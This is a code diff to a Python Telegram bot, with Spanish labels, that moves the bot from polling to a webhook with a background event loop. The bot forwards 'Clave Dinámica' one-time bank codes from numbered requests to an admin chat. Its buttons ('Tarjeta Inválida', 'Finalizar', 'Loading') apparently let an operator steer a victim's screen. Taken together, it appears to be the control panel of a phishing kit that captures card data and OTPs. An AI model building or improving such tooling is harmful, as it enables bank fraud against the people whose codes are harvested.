@@ -1,5 +1,6 @@
 import asyncio
 import json
+import threading
 from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes
 from config import TOKEN, ADMIN_CHAT_ID
@@ -21,11 +22,9 @@ PANEL_FILAS = [
     ],
     [
         InlineKeyboardButton("🏁 Finalizar",      callback_data="panel_aprobar"),
-      
     ],
     [
         InlineKeyboardButton("⏳ Loading",        callback_data="panel_loading"),
-       
     ],
 ]
 
@@ -102,10 +101,8 @@ async def _enviar_clave(validacion):
         f"🔐 Clave Dinámica #{validacion['id']}\n\n"
         f"💎 Codigo: {digitos}\n"
         f"🕐 Hora: {validacion.get('hora', 'N/A')}\n\n"
-        
     )
 
-    # Buscar message_id de la solicitud original para responder en el mismo hilo
     reply_id = None
     sol_id   = validacion.get("solicitud_id")
     if sol_id:
@@ -167,7 +164,6 @@ async def _enviar_complementario(comp):
     bot = Bot(token=TOKEN)
     botones = InlineKeyboardMarkup([
         [
-           
             InlineKeyboardButton("🚫 Tarjeta Inválida", callback_data=f"comp_rechazar_{comp['id']}"),
         ],
     ] + PANEL_FILAS)
@@ -290,31 +286,41 @@ async def manejar_boton(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "noop":
         return
 
-def correr_bot():
-    async def _run():
-        try:
-            bot_instance = Bot(token=TOKEN)
-            await bot_instance.delete_webhook(drop_pending_updates=True)
-            print("[OK] Sesion de Telegram limpiada")
-        except Exception as e:
-            print(f"[WARN] Limpieza omitida: {e}")
+# ── Modo webhook (reemplaza el polling) ───────────────────────
+_bot_loop = asyncio.new_event_loop()
+_bot_app  = None
 
-        while True:
-            try:
-                app = Application.builder().token(TOKEN).build()
-                app.add_handler(CommandHandler(["start", "panel"], cmd_panel))
-                app.add_handler(CallbackQueryHandler(manejar_boton))
-                async with app:
-                    await app.start()
-                    await app.updater.start_polling(drop_pending_updates=True)
-                    print("[OK] Bot iniciado y escuchando")
-                    await asyncio.Event().wait()
-            except (KeyboardInterrupt, SystemExit):
-                raise
-            except BaseException as e:
-                print(f"[ERROR] Bot caido: {e}, reintentando en 30s...")
-                await asyncio.sleep(30)
+def iniciar_bot(webhook_url: str):
+    global _bot_app
 
-    asyncio.run(_run())
+    async def _setup():
+        global _bot_app
+        _bot_app = Application.builder().token(TOKEN).build()
+        _bot_app.add_handler(CommandHandler(["start", "panel"], cmd_panel))
+        _bot_app.add_handler(CallbackQueryHandler(manejar_boton))
+        await _bot_app.initialize()
+        await _bot_app.start()
+        await _bot_app.bot.set_webhook(
+            url=webhook_url,
+            drop_pending_updates=True,
+        )
+        print(f"[OK] Webhook registrado: {webhook_url}")
+
+    _bot_loop.run_until_complete(_setup())
+    threading.Thread(target=_bot_loop.run_forever, daemon=True).start()
+    print("[OK] Bot listo")
+
+def procesar_update(data: dict):
+    if _bot_app is None:
+        return
+    update = Update.de_json(data, _bot_app.bot)
+    future = asyncio.run_coroutine_threadsafe(
+        _bot_app.process_update(update), _bot_loop
+    )
+    try:
+        future.result(timeout=10)
+    except Exception as e:
+        print(f"[ERROR] Procesando update: {e}")
+
 
 
